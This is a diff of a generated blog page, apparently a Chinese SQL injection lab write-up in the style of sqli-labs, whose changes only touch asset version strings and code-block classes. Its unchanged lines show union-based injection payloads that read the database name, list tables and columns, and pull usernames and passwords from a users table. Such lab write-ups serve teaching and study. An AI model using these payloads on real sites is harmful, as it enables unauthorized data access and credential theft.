@@ -9,7 +9,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
-<link rel="shortcut icon" href="https://lovectrl-tan.github.io/favicon.ico?v=1571496275908">
+<link rel="shortcut icon" href="https://lovectrl-tan.github.io/favicon.ico?v=1571974944269">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
 <link rel="stylesheet" href="https://lovectrl-tan.github.io/styles/main.css">
 
@@ -30,7 +30,7 @@
   <div class="top-container" data-aos="fade-right">
     <div class="top-header-container">
       <a class="site-title-container" href="https://lovectrl-tan.github.io">
-        <img src="https://lovectrl-tan.github.io/images/avatar.png?v=1571496275908" class="site-logo">
+        <img src="https://lovectrl-tan.github.io/images/avatar.png?v=1571974944269" class="site-logo">
         <h1 class="site-title">LoveCtrl-Tan</h1>
       </a>
       <div class="menu-btn" @click="menuVisible = !menuVisible">
@@ -110,18 +110,18 @@
 <code>?id=-1') union select 1,database(),3--+</code><br>
 <img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019170537.png" alt=""><br>
 爆出数据库名后我们接下来输入以下命令行查询表名</p>
-<pre><code class="language-URL">select table_name from information_schema.tables where table_schema='security' limit 0,1
+<pre><code>select table_name from information_schema.tables where table_schema='security' limit 0,1
 </code></pre>
 <p><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019170856.png" alt=""><br>
 <img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019170905.png" alt=""><br>
 当我们查询到第四个表名时发现了<code>users</code>很明显，这个就是用户名所在表，接下来我们使用以下命令行查询字段名</p>
-<pre><code class="language-URL">select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1
+<pre><code>select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1
 </code></pre>
 <p><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019171135.png" alt=""><br>
 <img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019171149.png" alt=""><br>
 <img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019171158.png" alt=""><br>
 接着我们就可以查询表里的数据啦</p>
-<pre><code class="language-URL">?id=1') union select 1,(select username from security.users limit 0,1),(select password from security.users limit 0,1)--+
+<pre><code>?id=1') union select 1,(select username from security.users limit 0,1),(select password from security.users limit 0,1)--+
 </code></pre>
 <figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/LoveCtrl-Tan/BlogPicture-/master/QQ%E6%88%AA%E5%9B%BE20191019171540.png" alt=""></figure>
 
